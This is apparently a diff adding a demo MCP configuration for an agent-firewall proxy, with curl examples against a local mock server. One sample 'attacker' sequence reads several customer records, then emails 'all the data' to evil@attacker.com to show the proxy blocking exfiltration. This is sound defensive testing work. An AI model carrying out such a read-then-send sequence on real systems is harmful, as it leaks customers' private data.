@@ -1,0 +1,66 @@
+# Kiro / Claude Code MCP Configuration for Agent Firewall Demo
+#
+# Add this to your ~/.kiro/settings/mcp.json (or claude_desktop_config.json)
+# to route tool calls through the mcpfw proxy.
+#
+# Prerequisites:
+#   1. Start the demo: bash ~/projects/mcpfw/demo/start_firewall.sh
+#   2. Add this config to your MCP settings
+#   3. Use the tools in a Kiro session — watch the audit log for decisions
+#
+# The proxy intercepts all tool calls, applies policy, and forwards to the mock server.
+# Try triggering the exfiltration pattern: read customer data, then try to email it externally.
+
+{
+  "mcpServers": {
+    "demo-firewall": {
+      "command": "curl",
+      "args": ["-s", "-X", "POST", "-H", "Content-Type: application/json", "-H", "X-Agent-Id: kiro-demo", "-d", "@-", "http://127.0.0.1:8443"],
+      "_comment": "This routes through mcpfw proxy. For real MCP-over-HTTP, use the URL directly."
+    }
+  }
+}
+
+# ─── Alternative: Direct HTTP endpoint ───────────────────────────────────────
+#
+# If your MCP client supports HTTP transport natively (most do now):
+#
+# Server URL: http://127.0.0.1:8443
+# Transport: Streamable HTTP
+# Headers: X-Agent-Id: kiro-session-1
+#
+# ─── Manual testing with curl ────────────────────────────────────────────────
+#
+# List tools:
+#   curl -s -X POST http://127.0.0.1:8443 \
+#     -H "Content-Type: application/json" \
+#     -H "X-Agent-Id: manual-test" \
+#     -d '{"jsonrpc":"2.0","id":1,"method":"tools/list","params":{}}'
+#
+# Call a tool (allowed):
+#   curl -s -X POST http://127.0.0.1:8443 \
+#     -H "Content-Type: application/json" \
+#     -H "X-Agent-Id: manual-test" \
+#     -d '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"search_kb","arguments":{"query":"password reset"}}}'
+#
+# Call a tool (will trigger envelope after reading customer data):
+#   curl -s -X POST http://127.0.0.1:8443 \
+#     -H "Content-Type: application/json" \
+#     -H "X-Agent-Id: attacker" \
+#     -d '{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"read_customer","arguments":{"id":"cust_001","__data_read":["customer_account"]}}}'
+#
+#   curl -s -X POST http://127.0.0.1:8443 \
+#     -H "Content-Type: application/json" \
+#     -H "X-Agent-Id: attacker" \
+#     -d '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"read_customer","arguments":{"id":"cust_002","__data_read":["customer_account"]}}}'
+#
+#   curl -s -X POST http://127.0.0.1:8443 \
+#     -H "Content-Type: application/json" \
+#     -H "X-Agent-Id: attacker" \
+#     -d '{"jsonrpc":"2.0","id":5,"method":"tools/call","params":{"name":"read_customer","arguments":{"id":"cust_003","__data_read":["customer_account"]}}}'
+#
+#   # This one gets BLOCKED:
+#   curl -s -X POST http://127.0.0.1:8443 \
+#     -H "Content-Type: application/json" \
+#     -H "X-Agent-Id: attacker" \
+#     -d '{"jsonrpc":"2.0","id":6,"method":"tools/call","params":{"name":"send_email","arguments":{"to":"evil@attacker.com","body":"all the data","__data_write":["email_external"]}}}'
